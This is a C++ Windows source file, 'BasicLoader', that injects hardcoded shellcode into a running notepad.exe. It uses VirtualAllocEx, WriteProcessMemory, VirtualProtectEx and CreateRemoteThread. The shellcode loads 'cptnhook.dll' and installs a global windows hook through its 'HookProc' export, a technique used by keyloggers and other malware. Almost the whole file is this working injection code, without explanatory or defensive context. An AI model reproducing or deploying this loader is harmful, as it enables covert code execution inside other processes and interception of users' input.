// BasicLoader.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <direct.h>
FILE* f;

#define SHELLCODE 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x74, 0x53, 0x56, 0x57, 0xC6, 0x45, 0xF4, 0x48, 0xC6, 0x45, 0xF5, 0x6F, 0xC6, 0x45, 0xF6, 0x6F, 0xC6, 0x45, 0xF7, 0x6B, 0xC6, 0x45, 0xF8, 0x50, 0xC6, 0x45, 0xF9, 0x72, 0xC6, 0x45, 0xFA, 0x6F, 0xC6, 0x45, 0xFB, 0x63, 0xC6, 0x45, 0xFC, 0x00, 0xC6, 0x45, 0xE4, 0x63, 0xC6, 0x45, 0xE5, 0x70, 0xC6, 0x45, 0xE6, 0x74, 0xC6, 0x45, 0xE7, 0x6E, 0xC6, 0x45, 0xE8, 0x68, 0xC6, 0x45, 0xE9, 0x6F, 0xC6, 0x45, 0xEA, 0x6F, 0xC6, 0x45, 0xEB, 0x6B, 0xC6, 0x45, 0xEC, 0x2E, 0xC6, 0x45, 0xED, 0x64, 0xC6, 0x45, 0xEE, 0x6C, 0xC6, 0x45, 0xEF, 0x6C, 0xC6, 0x45, 0xF0, 0x00, 0xC7, 0x45, 0xE0, 0x7B, 0x1D, 0x80, 0x7C, 0xC7, 0x45, 0xDC, 0x30, 0xAE, 0x80, 0x7C, 0xC7, 0x45, 0xD8, 0x11, 0x12, 0x43, 0x7E, 0xC7, 0x45, 0xD4, 0x46, 0x24, 0x80, 0x7C, 0x8D, 0x45, 0xE4, 0x50, 0xFF, 0x55, 0xE0, 0x83, 0xC4, 0x04, 0x89, 0x45, 0xCC, 0x83, 0x7D, 0xCC, 0x00, 0x75, 0x05, 0x83, 0xC8, 0xFF, 0xEB, 0x3D, 0x8D, 0x45, 0xF4, 0x50, 0x8B, 0x4D, 0xCC, 0x51, 0xFF, 0x55, 0xDC, 0x83, 0xC4, 0x08, 0x89, 0x45, 0xD0, 0x83, 0x7D, 0xD0, 0x00, 0x75, 0x07, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xEB, 0x1F, 0x6A, 0x00, 0x8B, 0x45, 0xCC, 0x50, 0x8B, 0x4D, 0xD0, 0x51, 0x6A, 0x03, 0xFF, 0x55, 0xD8, 0x83, 0xC4, 0x10, 0x68, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0x55, 0xD4, 0x83, 0xC4, 0x04, 0x33, 0xC0, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC2, 0x04, 0x00

BOOL str_ends_with(const char * str, const char * suffix) {
	size_t str_len;
	size_t suffix_len;
	if( str == NULL || suffix == NULL )
		return FALSE;
	str_len = strlen(str);
	suffix_len = strlen(suffix);
	if(suffix_len > str_len)
		return FALSE;
	return 0 == strncmp( str + str_len - suffix_len, suffix, suffix_len );
}


void _die(char * arg, int retVal) {
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "DIE(%d): %s\n", retVal, arg);
	fclose(f);
	if (retVal != 0) {
		fprintf(stderr, arg);
	} else {
		printf(arg);
	}
	exit(retVal);
};

#define DLL_FILE_NAME "cptnhook.dll"
#define PROC_NAME "HookProc"

BOOL _isProcessNamed(DWORD processID, const char * name) {
	char processName[MAX_PATH];
	HANDLE hProcess;
	HMODULE hMod;
	DWORD cbNeeded;
	processName[0] = 0;
	hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , FALSE, processID);
	if (hProcess != NULL) {
		if (EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName)/sizeof(TCHAR));
		}
	}
	CloseHandle(hProcess);
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "%s\n", processName);
	fclose(f);
	return 0 == _stricmp(processName, name);
}

/*
 * returns the pid of the first process named `name`
 */
DWORD findProcessByName(const char * name) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		if( aProcesses[i] != 0) {
			if (_isProcessNamed(aProcesses[i], name)) {
				return aProcesses[i];
			}
		}
	}
	return 0;
}

int _tmain() {
	int pid;
	HANDLE process;
	byte buf[] = {SHELLCODE};
	LPVOID address;
	SIZE_T bytesWritten;
	BOOL wrote, changed, freeOK;
	DWORD oldProtect;
	HANDLE hThread;
	char path[MAX_PATH];
	LPTHREAD_START_ROUTINE startRoutine;
	typedef HHOOK (*HINSTALLER)(HMODULE);
	typedef BOOL (*HUNINSTALLER)(HHOOK);
	fopen_s(&f, "c:\\temp.txt", "w");
	fclose(f);

	_getcwd(path, MAX_PATH);
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "cwd: %s\n", path);
	fclose(f);

	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "shellcode size: %d\n", sizeof(buf));
	fclose(f);

	pid = findProcessByName("notepad.exe");
	if (pid == 0) {
		_die("Failed to find explorer.exe", -1);
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "pid: %d\n", pid);
	fclose(f);
	process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);
	if (process == NULL) {
		_die("Failed to OpenProcess !", -2);
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "pHandle: %d\n", process);
	fclose(f);

	address = VirtualAllocEx(process, NULL, sizeof(buf), MEM_COMMIT, PAGE_READWRITE);
	if (address == NULL) {
		CloseHandle(process);
		_die("Failed to VirtualAllocEx !", -5);
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "memory address: %p\n", address);
	fclose(f);

	bytesWritten = 0;
	wrote = WriteProcessMemory(process,address,buf,sizeof(buf),&bytesWritten);
	if (!wrote){
		_die("Failed to write memory !", -6);
	}
	if (bytesWritten != sizeof(buf)){
		_die("Failed to write enough memory !", -7);
	}
	oldProtect = 0;
	changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READ,&oldProtect);
	if (!changed){
				int err = GetLastError();
		fopen_s(&f, "c:\\temp.txt", "a");
		fprintf(f, "err: %d\n", err);
		fclose(f);
		_die("Failed to change permission!", -8);
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "oldProtect: %x\n", oldProtect);
	fclose(f);

	#pragma warning(disable:4055) // 'type cast' : from data pointer 'LPVOID' to function pointer 'LPTHREAD_START_ROUTINE'
	startRoutine = (LPTHREAD_START_ROUTINE)address;
	hThread = CreateRemoteThread(process,NULL,0,startRoutine,NULL,0,NULL);
	if (NULL == hThread){
		_die("Failed to create remote thread !", -9);
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "hThread: %x\n", hThread);
	fclose(f);

	(void)freeOK;
	CloseHandle(process);
	return 0;
}
